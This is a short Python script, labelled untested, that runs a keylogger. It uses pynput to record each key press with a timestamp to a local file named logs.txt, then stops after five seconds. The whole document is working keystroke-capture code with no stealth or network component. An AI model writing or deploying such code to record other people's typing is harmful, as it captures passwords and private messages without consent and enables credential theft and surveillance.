#NOT TESTED
import os
from pynput.keyboard import Listener
import logging
from threading import Timer

logging.basicConfig(filename=("logs.txt"), \
    level=logging.DEBUG, format='%(asctime)s: %(message)s')

print("keylogger started.")
def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    Timer(5, listener.stop).start()
    listener.join()

print("keylogger shutdown.")